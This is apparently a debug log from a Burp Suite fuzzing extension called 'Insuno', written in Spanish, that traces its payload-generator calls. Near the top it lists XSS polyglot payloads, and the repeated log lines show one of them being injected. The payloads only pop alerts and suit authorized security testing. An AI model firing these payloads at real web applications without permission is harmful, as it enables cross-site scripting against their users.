+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@3e78b9a9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.BurpExtender.getGeneratorName', org.python.proxies.__main__$BurpExtender$0@65af5239)
+('Insuno.BurpExtender.registerExtenderCallbacks', org.python.proxies.__main__$BurpExtender$0@65af5239)
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@65af5239, burp.bvw@72369090)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23906cf2, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23906cf2, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23906cf2, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23906cf2, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23906cf2, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23906cf2, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23906cf2, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23906cf2, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23906cf2, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23906cf2, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23906cf2, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23906cf2, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@23906cf2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@23906cf2, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@65af5239, burp.bvw@6b72a600)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@2e70350a)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@2e70350a, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@65af5239, burp.bvw@3e34803a)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@7b360998)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@7b360998)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@7b360998, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@7b360998)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@7b360998, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@7b360998)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@7b360998, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
